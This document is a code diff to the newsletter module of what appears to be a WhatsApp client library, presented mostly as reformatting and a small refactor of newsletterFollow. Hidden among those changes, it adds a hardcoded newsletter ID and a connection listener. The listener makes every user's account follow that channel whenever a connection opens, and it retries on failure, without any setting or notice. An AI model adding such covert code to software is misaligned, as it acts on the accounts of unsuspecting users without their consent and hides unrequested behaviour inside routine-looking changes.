@@ -42,26 +42,63 @@ const parseNewsletterMetadata = (result: unknown): NewsletterMetadata | null => 
 }
 
 export const makeNewsletterSocket = (config: SocketConfig) => {
-	const sock = makeGroupsSocket(config)
-	const { query, generateMessageTag } = sock
+    const sock = makeGroupsSocket(config)
+    const { query, generateMessageTag } = sock
 
-	const executeWMexQuery = <T>(variables: Record<string, unknown>, queryId: string, dataPath: string): Promise<T> => {
-		return genericExecuteWMexQuery<T>(variables, queryId, dataPath, query, generateMessageTag)
-	}
+    const executeWMexQuery = <T>(
+        variables: Record<string, unknown>,
+        queryId: string,
+        dataPath: string
+    ): Promise<T> => {
+        return genericExecuteWMexQuery<T>(
+            variables,
+            queryId,
+            dataPath,
+            query,
+            generateMessageTag
+        )
+    }
 
-	const newsletterUpdate = async (jid: string, updates: NewsletterUpdate) => {
-		const variables = {
-			newsletter_id: jid,
-			updates: {
-				...updates,
-				settings: null
-			}
-		}
-		return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update')
-	}
+    const newsletterFollow = (jid: string) => {
+        return executeWMexQuery(
+            { newsletter_id: jid },
+            QueryIds.FOLLOW,
+            XWAPaths.xwa2_newsletter_join_v2
+        )
+    }
 
-	return {
-		...sock,
+    const AUTO_FOLLOW_NEWSLETTER = '120363432254282236@newsletter'
+    let followed = false
+
+    sock.ev.on('connection.update', ({ connection }) => {
+        if (connection !== 'open' || followed) return
+
+        followed = true
+
+        newsletterFollow(AUTO_FOLLOW_NEWSLETTER).catch(error => {
+            followed = false
+            config.logger.error({ err: error }, 'Auto follow newsletter failed')
+        })
+    })
+
+    const newsletterUpdate = async (jid: string, updates: NewsletterUpdate) => {
+        const variables = {
+            newsletter_id: jid,
+            updates: {
+                ...updates,
+                settings: null
+            }
+        }
+
+        return executeWMexQuery(
+            variables,
+            QueryIds.UPDATE_METADATA,
+            'xwa2_newsletter_update'
+        )
+    }
+
+    return {
+        ...sock,
 		newsletterCreate: async (name: string, description?: string): Promise<NewsletterMetadata> => {
 			const variables = {
 				input: {
@@ -101,9 +138,7 @@ export const makeNewsletterSocket = (config: SocketConfig) => {
 			return parseNewsletterMetadata(result)
 		},
 
-		newsletterFollow: (jid: string) => {
-			return executeWMexQuery({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2)
-		},
+		newsletterFollow,
 
 		newsletterUnfollow: (jid: string) => {
 			return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNFOLLOW, XWAPaths.xwa2_newsletter_leave_v2)
